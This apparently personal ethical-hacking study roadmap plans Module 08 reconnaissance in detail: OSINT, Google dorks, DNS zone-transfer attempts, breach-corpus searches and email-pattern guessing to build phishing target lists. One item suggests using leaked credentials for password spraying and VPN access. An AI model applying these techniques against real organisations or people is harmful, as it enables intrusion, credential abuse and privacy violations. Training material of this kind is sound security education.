
# Stage 2 — Offense I

---

### 🧭 Stage Navigation

| ◀ Previous Stage | 🏠 Master Hub | Next Stage ➔ | 📑 Quick Jump |
| :---: | :---: | :---: | :--- |
| [[Cyber-Security/Roadmap/Stage-1_Foundation\|◀ Stage 1: Foundation]] | [[Cyber-Security/Roadmap/README\|MASTER_README]] | [[Cyber-Security/Roadmap/Stage-3_Web-and-App-Sec\|Stage 3: Web & App Sec ➔]] | [[#🗂️ Table of Contents\|🗂️ Table of Contents]] · [[#🛠️ Mandatory Tool Stack (Must Master in This Stage)\|🛠️ Mandatory Tools]] · [[#🎮 Concurrent CTF Practice — Stage 2\|🎮 CTF Practice]] · [[#🏁 Stage Gate 1 — Host Dominance & Privilege Escalation\|🏁 Stage Gate 1]] |

---

> [!NOTE]
> **Stage Overview — Modules 08–13**
> - **⏱️ Estimated Time:** ~6–8 weeks of consistent daily sessions
> - **🎯 Modules:** `08` Footprinting & Recon · `09` Scanning · `10` Enumeration · `11` Database Security · `12` Password Cracking & Hash Analysis · `13` System Hacking & Initial Compromise
> - **🔴 Gate:** Root a box · dump & crack a hash · escalate privesc — before moving to Stage 3
> - **🎯 Primary Focus:** The complete recon-to-shell pipeline. Footprinting, scanning, enumeration, credential attacks, database exploitation, and system hacking (Linux & Windows privilege escalation).

---

> [!NOTE]
> ### 📝 Stage 2 Documentation Requirements
> Every attack I execute must be documented. Required artifacts:
> - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
> - **Tool output** — [[Nmap]] scans, Burp captures, [[Metasploit_Framework|Metasploit]] session logs saved to files
> - **Attack chain diagrams** showing the kill chain for each compromise
> - **3 HTB/VulnHub writeups** — full writeups committed to Git (private until published)
> - **Git commits** — commit after every lab session with descriptive messages
> _By the end of Stage 2, I should have 10+ documented attack chains in my repository._

> [!IMPORTANT]

### 🛠️ Mandatory Tool Stack (Must Master in This Stage)
> | Priority | Tool | Purpose & Core Skills | ✅ Complete By |
> | :--- | :--- | :--- | :--- |
> | **Tier 1 (Mandatory)** | [[Nmap]] | Host discovery, port scanning, service banner grabbing, NSE script auditing (`-sC -sV`). | **Module 09 — Topic 1 & 2 (Scanning)** |
> | **Tier 1 (Mandatory)** | [[Netcat]] / `socat` | Port binding, raw banner interaction, listener setup, encrypted reverse/bind shells. | **Module 10 — Topic 1 (Enumeration)** |
> | **Tier 1 (Mandatory)** | [[Responder]] | LLMNR/NBT-NS/mDNS spoofing, rogue WPAD proxy poisoning, NetNTLMv1/v2 hash harvesting. | **Module 12 — Topic 2 (Sniffing & Spoofing)** |
> | **Tier 1 (Mandatory)** | [[Hashcat]] | GPU password cracking, rule-based attacks (`best64.rule`), hash-mode identification (`-m 5600`). | **Module 12 — Topic 3 (Password Cracking)** |
> | **Tier 1 (Mandatory)** | [[Metasploit_Framework]] | Modular exploitation, auxiliary scanning, payload generation (`msfvenom`), Meterpreter navigation. | **Module 13 — Topic 1 & 2 (Exploitation)** |
> | **Tier 2 (Secondary)** | [[theHarvester]] & [[Amass]] | Passive OSINT, subdomain enumeration, organization surface mapping. | **Module 08 — Topic 1 & 2 (Reconnaissance)** |
> | **Tier 2 (Secondary)** | [[Hydra]] & [[John_the_Ripper]] | Online network service brute-forcing (SSH/SMB/FTP) and offline password hash cracking. | **Module 12 — Topic 3 (Password Cracking)** |
> | **Tier 2 (Secondary)** | [[LinPEAS]] & [[WinPEAS]] | Automated local privilege escalation vector enumeration on Linux and Windows targets. | **Module 13 — Topic 3 (Post-Exploitation & Privilege Escalation)** |
> **Stage 2 Exit Gate:** I cannot pass Stage 2 until I can scan a target subnet with `Nmap`, poison an internal broadcast query using `Responder`, crack the harvested NetNTLMv2 hash using `Hashcat`, exploit an unpatched service, and catch a stable reverse shell using `Netcat`.

---

### 🗂️ Table of Contents

- [[#🔹 Stage 2 Execution Pipeline|🔹 Stage 2 Execution Pipeline]]
- [[#Module 08: Footprinting & Reconnaissance|Module 08: Footprinting & Reconnaissance]]
  - [[#Topic 1: The "Ghost" Phase (Passive OSINT & Human Profiling) — 🧠🔬 Mixed|Topic 1: The "Ghost" Phase (Passive OSINT & Human Profiling)]]
  - [[#Topic 2: Semi-Passive Infrastructure Mapping — 🔬 Practical|Topic 2: Semi-Passive Infrastructure Mapping]]
  - [[#Topic 3: Active Footprinting & Network Interrogation — 🔬 Practical|Topic 3: Active Footprinting & Network Interrogation]]
  - [[#Topic 4: Advanced Fingerprinting & Logic Analysis — 🔬 Practical|Topic 4: Advanced Fingerprinting & Logic Analysis]]
  - [[#Topic 5: IPv6 & Protocol Enumeration — 🧠🔬 Mixed|Topic 5: IPv6 & Protocol Enumeration]]
  - [[#Topic 6: Dark Web & Breach Intelligence — 🔬 Practical|Topic 6: Dark Web & Breach Intelligence]]
  - [[#Topic 7: Satellite & Geospatial Intelligence (Optional — Skip unless physical pentest is in scope) — 🧠🔬 Mixed|Topic 7: Satellite & Geospatial Intelligence (Optional — Skip unless physical pentest is in scope)]]
  - [[#Topic 8: Strategy & Attack Mapping — 🧠 Conceptual|Topic 8: Strategy & Attack Mapping]]
  - [[#Lab Progression (Module 08: Footprinting & Reconnaissance)|Lab Progression (Module 08: Footprinting & Reconnaissance)]]
- [[#Module 09: Scanning|Module 09: Scanning]]
  - [[#Topic 1: Host Discovery & Network Topology (The "Roll Call") — 🔬 Practical|Topic 1: Host Discovery & Network Topology (The "Roll Call")]]
  - [[#Topic 2: Port, Service & Protocol Enumeration (The "Door Check") — 🔬 Practical|Topic 2: Port, Service & Protocol Enumeration (The "Door Check")]]
  - [[#Topic 3: Defense & Configuration Assessment (The "Armor Check") — 🔬 Practical|Topic 3: Defense & Configuration Assessment (The "Armor Check")]]
  - [[#Topic 4: Vulnerability Association & Attack Mapping — 🧠🔬 Mixed|Topic 4: Vulnerability Association & Attack Mapping]]
  - [[#Topic 5: Stealth & Evasion Techniques — 🔬 Practical|Topic 5: Stealth & Evasion Techniques]]
  - [[#Topic 6: Advanced Scanning Techniques — 🔬 Practical|Topic 6: Advanced Scanning Techniques]]
  - [[#Lab Progression (Module 09: Scanning)|Lab Progression (Module 09: Scanning)]]
- [[#Module 10: Enumeration|Module 10: Enumeration]]
  - [[#Topic 1: Service Enumeration & Banner Grabbing — 🔬 Practical|Topic 1: Service Enumeration & Banner Grabbing]]
  - [[#Topic 2: Directory & Identity Enumeration — 🔬 Practical|Topic 2: Directory & Identity Enumeration]]
  - [[#Topic 3: DNS & Infrastructure Enumeration — 🔬 Practical|Topic 3: DNS & Infrastructure Enumeration]]
  - [[#Topic 4: Database & Application Enumeration — 🔬 Practical|Topic 4: Database & Application Enumeration]]
  - [[#Topic 5: Attack Surface Consolidation & Enumeration OpSec — 🧠🔬 Mixed|Topic 5: Attack Surface Consolidation & Enumeration OpSec]]
  - [[#Lab Progression (Module 10: Enumeration)|Lab Progression (Module 10: Enumeration)]]
- [[#Module 11: Database Security|Module 11: Database Security]]
  - [[#Topic 1: Database Enumeration & Fingerprinting — 🔬 Practical|Topic 1: Database Enumeration & Fingerprinting]]
  - [[#Topic 2: Relational Database Exploitation — 🔬 Practical|Topic 2: Relational Database Exploitation]]
  - [[#Topic 3: NoSQL & Modern Database Attacks — 🔬 Practical|Topic 3: NoSQL & Modern Database Attacks]]
  - [[#Topic 4: Database Privilege Escalation — 🔬 Practical|Topic 4: Database Privilege Escalation]]
  - [[#Topic 5: Database Auditing & Defence — 🧠🔬 Mixed|Topic 5: Database Auditing & Defence]]
  - [[#Lab Progression (Module 11: Database Security)|Lab Progression (Module 11: Database Security)]]
- [[#Module 12: Password Cracking & Hash Analysis|Module 12: Password Cracking & Hash Analysis]]
  - [[#Topic 1: Hash Identification & Acquisition — 🔬 Practical|Topic 1: Hash Identification & Acquisition]]
  - [[#Topic 2: Cracking Methodology & Tools — 🔬 Practical|Topic 2: Cracking Methodology & Tools]]
  - [[#Topic 3: Protocol-Specific Cracking — 🔬 Practical|Topic 3: Protocol-Specific Cracking]]
  - [[#Topic 4: Wordlist & Intelligence Curation — 🔬 Practical|Topic 4: Wordlist & Intelligence Curation]]
- [[#Module 13: System Hacking & Initial Compromise|Module 13: System Hacking & Initial Compromise]]
  - [[#Topic 1: The Breach (Initial Access & Exploitation) — 🔬 Practical|Topic 1: The Breach (Initial Access & Exploitation)]]
  - [[#Topic 2: The Ascension (Privilege Escalation) — 🔬 Practical|Topic 2: The Ascension (Privilege Escalation)]]
  - [[#Topic 3: The Stronghold (Persistence & Lateral Movement) — 🔬 Practical|Topic 3: The Stronghold (Persistence & Lateral Movement)]]
  - [[#Topic 4: The Shadow (Defense Evasion & Anti-Forensics) — 🧠🔬 Mixed|Topic 4: The Shadow (Defense Evasion & Anti-Forensics)]]
  - [[#Topic 5: Data Exfiltration & Impact — 🔬 Practical|Topic 5: Data Exfiltration & Impact]]
  - [[#Topic 6: The Professional (Governance & Reporting) — 🧠🔬 Mixed|Topic 6: The Professional (Governance & Reporting)]]
  - [[#Lab Progression (Module 13: System Hacking & Initial Compromise)|Lab Progression (Module 13: System Hacking & Initial Compromise)]]
- [[#🔹 Architecture Alignment Note: Network & Weaponization Tracks|🔹 Architecture Alignment Note: Network & Weaponization Tracks]]
  - [[#🎮 Concurrent CTF Practice — Stage 2|🎮 Concurrent CTF Practice — Stage 2]]
  - [[#🏆 Stage 2 Capstone Project|🏆 Stage 2 Capstone Project]]
  - [[#🧭 Stage 2 Reflection & Competency Check|🧭 Stage 2 Reflection & Competency Check]]
- [[#🛠️ Stage 2 Mini Projects|🛠️ Stage 2 Mini Projects]]
  - [[#Project 10 — Port Scanner|Project 10 — Port Scanner]]
  - [[#Project 11 — Network Packet Sniffer|Project 11 — Network Packet Sniffer]]
  - [[#Project 13 — Subdomain Scanner|Project 13 — Subdomain Scanner]]
  - [[#Project 14 — Vulnerability Scanner|Project 14 — Vulnerability Scanner]]
- [[#🏁 Stage Gate 1 — Host Dominance & Privilege Escalation|🏁 Stage Gate 1 — Host Dominance & Privilege Escalation]]

---

## 🔹 Stage 2 Execution Pipeline

> _Modules 08–13 — Learn to find, probe, crack, and compromise targets. This is the core recon-to-shell pipeline._

> [!IMPORTANT]
> ### 📋 Stage 2 Module Execution Order
> Follow this linear module sequence:
>
> | Step | Module | Focus |
> | :---: | :--- | :--- |
> | 1 | [[#Module 08: Footprinting & Reconnaissance\|Module 08]] | Footprinting & Reconnaissance |
> | 2 | [[#Module 09: Scanning\|Module 09]] | Scanning |
> | 3 | [[#Module 10: Enumeration\|Module 10]] | Enumeration |
> | 4 | [[#Module 11: Database Security\|Module 11]] | Database Security |
> | 5 | [[#Module 12: Password Cracking & Hash Analysis\|Module 12]] | Password Cracking & Hash Analysis |
> | 6 | [[#Module 13: System Hacking & Initial Compromise\|Module 13]] | System Hacking & Initial Compromise |
>
> **Why this order?**
> ```text
> What exists?               → Module 08 (Recon)
> Where is it?               → Module 09 (Scanning)
> What services are running? → Module 10 (Enumeration)
> What databases expose?     → Module 11 (Database Security)
> Can I use credentials?     → Module 12 (Password Cracking)
> Can I gain/escalate?       → Module 13 (System Hacking)
> ```

> [!NOTE]
> **Stage 2 Progress Check — do NOT proceed until I can demonstrate all of these:**
> - Perform reconnaissance and enumeration **without jumping to Metasploit immediately**
> - Identify open ports, running services, and software versions on a target
> - Crack a captured hash using a wordlist and rules
> - Gain initial access via at least two different vectors (e.g., exploit + credential reuse)
> - Escalate privileges on both **Linux** (SUID, sudo misconfig, cron, PATH injection) and **Windows** (unquoted service paths, SeImpersonate, token impersonation)
> - Establish a persistence mechanism
> - Document the full attack chain in a structured report
> **Evidence required before completing Stage 2:**
> - Attack chain diagram committed to Git
> - Lab notes (target → recon → exploitation → post-exploitation → findings)
> - At least 1 completed HTB/THM machine writeup covering the full chain

---
## Module 08: Footprinting & Reconnaissance
[[Module-08_Footprinting-and-Reconnaissance|📁]]

> [!NOTE]
> **📚 Recommended Books for This Module**
> - 🔴 `The Hacker Playbook 2` — Chapter 1: Recon section — real-world attacker passive + active OSINT methodology
> - 🔴 `Red Team Field Manual v3` — ⚡ Keep open always as command reference
> - 🟡 `Counter Hack Reloaded - Ed Skoudis & Tom Liston` — Recon chapters — structured methodology for the full recon pipeline
> - 🟡 `Cybersecurity Attack-and-Defense Strategies 2nd` — Reconnaissance chapter — how defenders see my recon footprint (OPSEC awareness)
> - 🟢 `Python for OSINT Tooling` — Full book — build my own OSINT automation tools in Python

> [!TIP]
> ⏱️ **Module 08 Total Time Budget: 1.5–2 weeks**
> Topic 1 (passive OSINT): 3–4 days | Topic 2 (semi-passive): 2 days | Topic 3 (active): 2–3 days | Topic 4 (advanced fingerprinting): 1–2 days | Topic 5 (IPv6/protocols): 1–2 days | Topic 6 (dark web): 1 day | Topic 7 (satellite/geo): SKIP | Topic 8 (strategy): 1 day | Labs: 3–4 days.
> Recon is the phase pentesters rush and then pay for later. Invest proper time here. Every finding from Module 08 feeds directly into Module 09 targeting decisions. A good recon phase cuts enumeration time in half.

### Topic 1: The "Ghost" Phase (Passive OSINT & Human Profiling) — 🧠🔬 Mixed
[[Topic-1_The-Ghost-Phase_Passive-OSINT-and-Human-Profiling|📁]]

> [!TIP]
> **Goal:** Maximum data acquisition with zero target interaction.

> [!NOTE]
> ⏱️ **Time Bracket: 3–4 days** — Day 1: Organizational profiling (org chart, LinkedIn employees, job postings exposing tech stack, domain ownership via WHOIS), Google Dorks (`site:`, `filetype:pdf`, `intitle:"index of"`, `inurl:admin`, `ext:sql`), physical vectors (shoulder surfing, tailgating, dumpster diving — awareness level). Day 2: Metadata & leak analysis (Wayback Machine, GitHub dorking for API keys/tokens, repo commit history, exiftool on public PDFs). Day 3: Breach corpora (HIBP, Dehashed), mail posture (SPF/DMARC/DKIM via mxtoolbox), passive DNS, Certificate Transparency (crt.sh). Day 4: Review, cross-reference all findings, and write up the full passive recon report for a bug bounty target (HackerOne) listing all subdomains, emails, tech stack, and breach data found.

- [x] **Organizational Hierarchy:** Profile the **Audience** (Stakeholders, HR, Legal, Management) to understand who holds the keys and who is the weakest link.

- [x] **Search Engine Hacking:** Use **Google Dorks** (`site:`, `filetype:`, `intitle:`) to find exposed documents and login portals.

- [x] **Social Vector Mapping:** Scrape LinkedIn and professional sites to identify targets for **Phishing, Whishing, Whaling, or Smishing** based on reported tech stacks.

- [x] **Physical Perimeter Assessment:** Evaluate the likelihood of **Shoulder Surfing, Tailgating, or Dumpster Diving** vulnerabilities.

- [x]  **Metadata & Leak Analysis**:Use Wayback Machine for historical paths and GitHubGitLab Dorking for hardcoded API keys or internal naming conventions

- [x] **Domain & Ownership:** Perform **WHOIS Lookups** to identify registration dates, contact info, and associated subdomains.

- [x] **Passive DNS & CT:** Pull **passive DNS** and **Certificate Transparency (crt.sh)** to surface shadow subdomains and SANs; cluster hosting/ASN/country.

- [x] **Breach & Paste Monitoring:** Check **breach corpuses** (HIBP/Dehashed) and pastes/code search for leaked creds, API keys, or internal hostnames.

- [x] **Mail Posture Recon:** Review **SPF/DMARC/DKIM** to assess spoofing risk and likely mail providers.

---

### Topic 2: Semi-Passive Infrastructure Mapping — 🔬 Practical
[[Topic-2_Semi-Passive-Infrastructure-Mapping|📁]]

> [!TIP]
> **Goal:** Querying third-party aggregators to see what the world already knows about them.

> [!NOTE]
> ⏱️ **Time Bracket: 2 days** — Day 1: Third-party scan aggregators (Shodan queries: `org:"Target Corp"`, `port:22 country:US`; Censys: `parsed.names: target.com`; VirusTotal/urlscan.io for domain behaviour), subdomain enumeration (Sublist3r + Amass + crt.sh — run all three and deduplicate). Day 2: DNS record mapping (MX reveals mail provider, NS reveals registrar/hosting, TXT reveals SPF + G Suite/O365 presence, SRV reveals internal service topology), WAF/CDN fingerprinting (JA3/JA4, Cloudflare CF-Ray header, Akamai reference markers, favicon hashing via Shodan dorks). Deliverable: build a consolidated subdomain + DNS + hosting map for a bug bounty target using only third-party sources with zero direct target traffic.

- [x] **External Intel Scouring:** Query **VirusTotal, urlscan, any.run, Joe Sandbox, and urlvoid** for existing malware samples or documented domain behavior.

- [ ] **Third-Party Scans:** Use **Shodan & Censys** to find open ports, outdated services, and geographical distribution without scanning the target myself.

- [ ] **Subdomain & DNS Enumeration:** Use **Sublist3r/Amass** for subdomains and check **DNS records** (MX, TXT, NS) to map mail providers and third-party integrations.

- [ ] **Protocol Audit:** Identify if the target is clinging to **Insecure Protocols** (FTP vs. SFTP, SSL vs. TLS).

- [ ] **WAF/CDN/TLS Fingerprinting:** Detect **WAF/CDN** fronting via **JA3/JA4, HTTP header quirks, TLS ALPN/HTTP2**, and favicon hashes.

- [ ] **VHost & Favicon Hunts:** Bruteforce **vhosts/domains** and use **favicon hash**/HTTP header diffs to find hidden apps.
---

### Topic 3: Active Footprinting & Network Interrogation — 🔬 Practical
[[Topic-3_Active-Footprinting-and-Network-Interrogation|📁]]

> [!TIP]
> **Goal:** Direct contact to map the live network fabric. Risk of detection is now ACTIVE.

> [!NOTE]
> ⏱️ **Time Bracket: 2–3 days** — Day 1: Host discovery (ping/arp/hping3 sweeps), traceroute analysis (identifying perimeter/DMZ/segmentation hops), basic Nmap stealth scan (`-sS`) + OS fingerprinting (`-O`), aggressive DNS interrogation (zone transfer attempts via `dig axfr`, brute-forcing with `dnsx`/`dnsenum`). Day 2: Web content discovery (ffuf/Gobuster directory bruteforcing with SecLists wordlists, Wappalyzer tech stack fingerprinting), TLS surface harvesting (cert SANs, cipher suites, HTTP/2 ALPN negotiation, redirect chains), web route mapping (robots.txt, sitemap.xml, parameter fuzzing with status/size filters). Day 3: Compile and annotate findings into a structured active recon report; verify all discovered assets and validate against passive recon data. Deliverable: produce a full active recon report against your home lab target including live hosts, open ports, tech stack, and web directories found.

- [ ] **Live Host Discovery:** Use **ping, arp, and hping** to identify which internal or external assets are actually breathing.

- [ ] **Network Path Analysis:** Use **tracert** to map the hops and identify **Perimeter vs. DMZ vs. Segmentation** boundaries.

- [ ] **Surgical Port Scanning:** Execute **Nmap Essentials** (starting with `-sS` stealth scans) to identify listening services and **OS Fingerprinting**.

- [ ] **Aggressive DNS Interrogation:** Use **nslookup and dig** to force the disclosure of hidden internal records or mail servers.

- [ ] **Web Content Discovery:** Run **[[ffuf]] or [[Gobuster]]** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).

- [ ] **TLS Surface:** Harvest **cert SANs**, check **cipher/curve** support, **HTTP/2/ALPN** negotiation, and redirect/downgrade behavior.

- [ ] **Web Route Mapping:** Parse **robots.txt/sitemap.xml** and fuzz **parameters/paths** with status/length filters to uncover hidden routes.

---

### Topic 4: Advanced Fingerprinting & Logic Analysis — 🔬 Practical
[[Topic-4_Advanced-Fingerprinting-and-Logic-Analysis|📁]]

> [!TIP]
> **Goal:** Understand the defensive "brain" of the target.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: Traffic analysis (Wireshark on a captured interface — filter by protocol, identify handshake weaknesses, extract cleartext credentials from unencrypted protocols), defensive profiling (detect IDS/IPS via scan response timing anomalies, WAF via blocked requests, EDR presence via process list or known endpoint names, SIEM via log shipping ports). Day 2: LOLBAS/GTFOBins awareness mapping (identify potential living-off-the-land vectors for the target OS before you have a shell), write up the defensive posture fingerprint. Deliverable: fingerprint the defensive posture of your lab target and document which controls are present and which gaps exist.

- [ ] **Traffic Analysis:** If vantage is gained, use **[[Wireshark]]** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.

- [ ] **Defensive Profiling:** Identify the presence of **IDS/IPS, SIEM, SOAR, and EDR/DLP**. If found, slow down my operation immediately.

- [ ] **Unintended Binary Research:** Map the target's OS to potential **LOLBAS, GTFOBins, or WADCOMS** vectors for later movement. _(See Module 13 for canonical LOLBAS/GTFOBins coverage.)_

- [ ] **Version-to-CVE Correlation:** Cluster hosts by **banners/JA3/favicons** and map exposed versions to **CVE** candidates before exploitation.

---

### Topic 5: IPv6 & Protocol Enumeration — 🧠🔬 Mixed
[[Topic-5_IPv6-and-Protocol-Enumeration|📁]]

> [!TIP]
> **Goal:** Discover targets using newer protocols and dual-stack networks.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: IPv6 recon (Shodan/Censys queries for IPv6, `nmap -6` sweeps, NDP link-local discovery), DHCPv6 enumeration (prefix, DNS server, domain name extraction), SNMP enumeration (community strings public/private with snmpwalk, `onesixtyone`, MIB data: routing tables, interfaces, processes). Day 2: LDAP probing (port 389 anonymous bind — users, groups, computers), NFS exports (showmount -e — world-readable exports), RPC enumeration (rpcclient, rpcinfo on port 135/445 — user SIDs, domain info). Deliverable: enumerate SNMP and LDAP on a lab target and extract at least 10 pieces of actionable information from each.

- [ ] **IPv6 Reconnaissance:** Identify **IPv6 addresses** via **Shodan, Censys, IPv6 address enumeration tools** even when IPv4 is locked down.

- [ ] **Link-Local Discovery:** Scan for **link-local addresses** to discover local IPv6 devices and address schemes.

- [ ] **DHCPv6 Enumeration:** Use **DHCPv6 client** to extract **prefix, DNS servers, domain names** from DHCP responses.

- [ ] **SNMP Enumeration:** Query **SNMP community [[strings]]** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.

- [ ] **LDAP Probing:** Query **LDAP** on **port 389** to enumerate **users, groups, organizational structure, computer objects**.

- [ ] **NFS Shares:** Probe for **NFS exports** on **port 2049** and attempt to mount for **file enumeration and exfiltration**.

- [ ] **RPC Enumeration:** Use **rpcclient, nmap NSE** to interrogate **RPC services** on **port 135/445** for **users, groups, shares**.

---

### Topic 6: Dark Web & Breach Intelligence — 🔬 Practical
[[Topic-6_Dark-Web-and-Breach-Intelligence|📁]]

> [!TIP]
> **Goal:** Uncover intelligence from dark web and historical breaches.

> [!NOTE]
> ⏱️ **Time Bracket: 1–2 days** — Day 1: Breach corpus searching (HIBP/Dehashed for corporate email domains, build a targeted credential list), threat actor profiling (identify APT groups targeting your industry via MITRE ATT&CK Groups, check ransomware gang leak sites for past victims in the sector). Day 2: Credential stuffing intelligence (evaluate breach data quality: hash vs plaintext, how old, reuse potential), practice building and annotating a structured threat intelligence profile. Ethics: this is intelligence gathering only — never use breach credentials against real targets. Deliverable: perform a breach search for a personal test email domain and document what data is exposed.

- [ ] **Dark Web Searches:** Use **Tor, I2P**, or dedicated **dark web search engines** to find **leaked corporate data, stolen creds, threat reports**.

- [ ] **Breach Corpus Searching:** Query **Dehashed, Have I Been Pwned, Shodan**, and **breach databases** for **employee emails, leaked credentials, domain info**.

- [ ] **Threat Actor Profiling:** Identify relevant **APT groups, cybercrime forums, adversary tradecraft** that target my industry.

- [ ] **Ransomware Gang Sites:** Monitor **ransomware operator sites** for **leaked data, victim announcements, negotiation demands**.

- [ ] **Credential Stuffing Data:** Leverage **leaked cred combos** for **password spray, targeted phishing, VPN/email access**.

---

### Topic 6B: Advanced OSINT & Digital Investigations — 🔬 Practical
[[Topic-6B_Advanced-OSINT|📁]]

> [!TIP]
> **Goal:** Master advanced open-source intelligence techniques and digital investigations

> [!NOTE]
> ⏱️ **Time Bracket: 4–5 days** — Master advanced OSINT methodologies and investigation frameworks to extract intelligence from publicly available sources. Study advanced search engine operators (Google dorking, Bing/Yandex intelligence), domain/DNS reconnaissance (WHOIS, certificate transparency, subdomain enumeration), email pattern analysis, and social media intelligence (LinkedIn org mapping, Twitter/X monitoring, GitHub reconnaissance). Learn metadata extraction from images (EXIF GPS coordinates) and documents, cryptocurrency blockchain analysis, geolocation techniques, username correlation across platforms, and threat actor profiling. Understand OSINT automation through Python scripts, Maltego transforms, and API integration while respecting legal and ethical boundaries (GDPR, CCPA, CFAA compliance, TOS adherence). Deliverable: conduct a complete OSINT investigation on a public figure (educational purpose only), trace cryptocurrency transaction chains, and build an automated intelligence collection pipeline that aggregates data from multiple sources.

- [ ] **OSINT Framework (osintframework.com):** Master this comprehensive tool directory organized by intelligence collection category (domain/email/social media/etc.). *OSINT angle: primary reference for discovering specialized tools by collection target.*
- [ ] **Buscador VM:** OSINT-focused Linux distribution pre-configured with reconnaissance tools. Alternative to manual tool installation for rapid deployment.
- [ ] **Intelligence Cycle Methodology:** Follow the five-phase process: Direction (define collection requirements) → Collection (gather raw data) → Processing (organize/translate raw data) → Analysis (derive intelligence from processed data) → Dissemination (deliver actionable intelligence to stakeholders). *OSINT angle: structured methodology prevents random data hoarding; ensures findings answer specific questions.*
- [ ] **Source Validation & Verification:** Cross-reference information across multiple independent sources. Check publication dates for staleness. Assess source credibility and bias. Distinguish primary sources from secondary reporting. *OSINT angle: adversaries plant disinformation; single-source reliance creates false confidence.*
- [ ] **Attribution Confidence Levels:** Use intelligence community standards: **Confirmed** (multiple corroborated sources, high confidence), **Likely** (strong evidence, some gaps), **Possible** (limited evidence, plausible), **Doubtful** (weak evidence, contradictory indicators). Never present assumptions as facts. *OSINT lesson: transparent confidence assessment prevents over-commitment to weak intelligence.*

- [ ] **Google Dorking — site: operator:** Search within specific domains/subdomains (`site:target.com filetype:pdf` finds all PDFs on target.com; `site:*.target.com` includes subdomains). *OSINT angle: bypass website search functionality; enumerate resources website doesn't link publicly.*
- [ ] **Google Dorking — inurl:/intitle:/intext: operators:** `inurl:admin` finds URLs containing "admin"; `intitle:login` finds pages with "login" in title; `intext:"confidential"` finds body text matches. Combine: `site:target.com inurl:admin intitle:login` narrows to login panels. *OSINT angle: discover forgotten admin interfaces, staging servers, dev environments.*
- [ ] **Google Dorking — filetype: operator:** Target specific document types (`filetype:pdf`, `filetype:xlsx`, `filetype:docx`, `filetype:txt`, `filetype:sql`, `filetype:log`). Combine with site: for targeted document harvesting. *OSINT angle: exposed spreadsheets/SQL dumps leak credentials, business data, internal documentation.*
- [ ] **Google Dorking — cache: operator:** View Google's cached version of a page (`cache:example.com`). Useful when target removed content but Google still indexes it. *OSINT angle: recover deleted pages before Wayback Machine crawls them.*
- [ ] **Google Dorking — related: operator:** Find similar websites (`related:target.com`). Useful for competitor analysis and infrastructure correlation. *OSINT angle: shared hosting/CDN patterns reveal infrastructure relationships.*
- [ ] **Google Hacking Database (GHDB):** Study exploit-db.com/google-hacking-database for pre-built dorks targeting vulnerable configurations (exposed .git directories, default credentials pages, SQL errors, directory listings). *OSINT angle: industrialized reconnaissance — reuse community-tested queries.*
- [ ] **Bing Advanced Operators — ip: operator:** `ip:192.0.2.1` finds websites hosted on specific IP (deprecated in Google). Useful for shared hosting enumeration and reverse IP lookups. *OSINT angle: one compromised site on shared host may reveal others.*
- [ ] **Bing Advanced Operators — feed:/hasfeed: operators:** `feed:target.com` finds RSS/Atom feeds; `hasfeed:target.com` finds pages with RSS. *OSINT angle: RSS feeds bypass paywalls and reveal content updates in real-time.*
- [ ] **Bing Advanced Operators — url: operator:** Search URL components. Less precise than Google's inurl but available when Google results are geo-restricted.
- [ ] **Yandex Search for Russian/CIS Content:** Yandex indexes Russian-language content more thoroughly than Google. Better image reverse search for faces (less privacy filtering). *OSINT angle: critical for investigations involving Eastern European infrastructure/actors.*
- [ ] **DuckDuckGo Bangs:** Shortcut syntax for direct site searches (`!gh query` searches GitHub, `!w query` searches Wikipedia, `!so query` searches Stack Overflow). Faster than manual site navigation. *OSINT angle: efficient multi-platform querying without browser history tracking.*

- [ ] **WHOIS Historical Data:** Use DomainTools or WhoisXMLAPI to track registrant changes over time. *OSINT angle: previous registrant email addresses, phone numbers, and addresses reveal ownership history and infrastructure pivots.*
- [ ] **DNS History:** SecurityTrails and DNSdumpster archive historical DNS records (A, MX, NS changes). *OSINT angle: old IPs reveal previous hosting providers, potential forgotten subdomains still resolving to old infrastructure.*
- [ ] **Certificate Transparency Logs:** crt.sh and Censys Certificates index all SSL/TLS certificates ever issued. Query by domain to discover subdomains (even those not in public DNS). *OSINT angle: CT logs bypass DNS for subdomain enumeration — dev.target.com, staging.target.com, admin.target.com visible even if DNS is restricted.*
- [ ] **Subdomain Takeover Detection:** Use can-i-take-over-xyz to identify dangling DNS records pointing to unclaimed cloud resources (S3 buckets, Azure blobs, Heroku apps). *OSINT angle: subdomain takeover = full control over subdomain for phishing/malware distribution under target's brand.*
- [ ] **Email Security Records Analysis:** Check SPF, DKIM, DMARC records (`dig TXT target.com`, `dig TXT _dmarc.target.com`). *OSINT angle: weak DMARC policy (p=none) allows spoofed emails; SPF includes reveal authorized email infrastructure (cloud providers, marketing platforms).*
- [ ] **DNS Zone Transfers:** Attempt `dig axfr @nameserver domain.com` against target nameservers. *OSINT angle: misconfigured zones leak complete DNS records (all subdomains, internal hostnames). Rare but devastating when successful.*
- [ ] **Reverse DNS Lookups (PTR records):** Query `dig -x 192.0.2.1` to resolve IP to hostname. *OSINT angle: reveals hosting relationships and internal naming conventions (server1.internal.target.com).*
- [ ] **ASN Intelligence:** Use bgp.he.net or RIPE to identify Autonomous System Numbers and netblocks owned by target. *OSINT angle: full IP range enumeration — scan entire ASN to discover all internet-facing infrastructure.*

- [ ] **Email Format Pattern Analysis:** Infer corporate email patterns from LinkedIn profiles or discovered addresses (`firstname.lastname@target.com`, `first.last@target.com`, `flast@target.com`, `f.lastname@target.com`). *OSINT angle: once pattern is confirmed, generate valid email addresses for entire employee list (phishing target list).*
- [ ] **Hunter.io Email Discovery:** Search by domain to find publicly disclosed email addresses and verify deliverability. API available for automation. *OSINT angle: builds contact database from scattered web mentions; confidence score indicates verification status.*
- [ ] **Email Permutator Tools:** Generate all possible email combinations from first/last names using common patterns. Verify with SMTP or Hunter.io. *OSINT angle: targeted spear-phishing requires valid addresses — permutation + verification ensures deliverability.*
- [ ] **Email Reputation Check (EmailRep.io):** Query email addresses for reputation, breaches, spam activity, social media profiles. *OSINT angle: low-reputation addresses indicate disposable/burner emails or compromised accounts.*
